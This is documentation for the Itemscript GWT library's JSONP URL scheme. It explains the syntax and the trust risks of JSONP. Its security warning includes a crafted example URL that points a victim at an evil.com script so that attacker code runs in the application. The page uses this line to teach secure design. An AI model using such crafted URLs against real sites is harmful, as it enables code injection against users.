_Support for JSONP is not in the current release, but is implemented & will be in the next release._

# JSONP URLS in the GWT environment #

JSONP ("JSON with padding") refers to the use of HTML `<SCRIPT>` tags to get around the Same-Origin Policy in web browsers. For background: http://en.wikipedia.org/wiki/JSON#JSONP

JSONP is inherently only able to make GET requests, and is asychronous, so the JsonpConnector is an AsyncGetConnector.

JSONP implementations vary somewhat; generally they require you to supply a callback name in a query-string parameter supplied in the URL; they may also allow you to supply a second callback name to be called in the event of an error. For multiple requests to be made at the same time, the callback name should be a uniquely-generated name, and to avoid memory leaks the `<SCRIPT>` tag needs to be cleaned up after the response has completed. GWT's JSONP module manages those things for us. All we need to do is supply the callback name.

We define a URL scheme for JSONP URLs so that they can be separately dispatched from ordinary HTTP requests by the Itemscript library.

This scheme looks like this:

`jsonp:callbackParam,originalUrl`

or

`jsonp:callbackParam;errorCallbackParam,originalUrl`

For instance:

`jsonp:callback,http://twitter.com/statuses/user_timeline.json?screen_name=itemscript`

Here the callback parameter is called "callback" and there is no error callback.

Bear in mind that JSONP involves **complete trust** of the server you are connecting to, because everything they return will be executed as JavaScript **in the context of your application**. You should be very careful not to build an application that can cause a user-supplied URL to be downloaded by Itemscript without strictly checking it; you should be especially careful not to allow a third-party to send someone to a page on your site that trigger the download of a URL through Itemscript.

For instance, this would be a really, really bad idea:

`http://example.com/MyApplication.html#http://example.com/myDataSource.json`

Here you'd be taking a URL from the history token and automatically downloading it when your application starts. That means that by crafting a URL and persuading someone to click on it, they could be sent to a JSONP server that will cause them to download and execute whatever code the attacker wants:

`http://example.com/MyApplication.html#jsonp:callback,http://evil.com/evilscript.js`

Not all attacks are this obvious, but in general this maxim applies: never use a URL from an untrusted source, or one that connects to an untrusted server. If you need to connect to an untrusted server, do it from your own server, with appropriate security precautions, and send the result back to the client as JSON that can be safely parsed. This applies to all URLs, not just JSONP URLs, but JSONP is the most obvious and straightforward attack vector. One way to be safer is to construct URLs yourself from a fixed prefix, like your GWT host page's URL, and only add path & query information from user-supplied data. Combined with URL-encoding of path and query components, that is a fairly safe way of incorporating user-supplied data into a URL.

Itemscript is a registered trademark of Data Base Architects, Inc. The Itemscript specification, the Itemstore API specification and the JAM template language specification are open source works published under the new BSD license.